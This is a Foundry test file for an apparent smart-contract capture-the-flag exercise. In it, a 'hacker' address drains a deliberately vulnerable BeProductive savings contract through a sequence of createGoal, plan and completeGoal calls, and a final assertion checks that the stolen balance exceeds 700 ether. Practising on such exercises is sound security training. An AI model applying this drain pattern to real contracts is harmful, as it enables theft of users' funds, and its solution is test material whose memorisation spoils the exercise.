// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import { Test } from "forge-std/Test.sol";
import { BeProductive } from "../src/4_BeProductive.sol";
import "../mocks/marqToken.sol";
import {console} from "forge-std/console.sol";

contract BeProductiveTest is Test {
    BeProductive public target;
    MarqToken public token;
    address public tokenAddress;

    struct ProgressTracker {
        uint256 saved;
        uint256 target;
    }


    function setUp() public {
        token = new MarqToken();
        tokenAddress = address(token);
        target = new BeProductive(address(token));




        token.mint(600 ether);
        token.transfer(address(0xBAD), 10 ether);
        token.transfer(address(target), 590 ether);
    }


 
    function test_GetThisPassing_4() public {
        address hacker = address(0xBAD);

        vm.startPrank(hacker);
        token.approve(address(target), 10 ether);
      target.createGoal(10 ether , 590 ether);
      target.plan(590 ether);
      target.completeGoal();
        vm.stopPrank();
        assertGt(token.balanceOf(hacker), 700 ether);
    }

}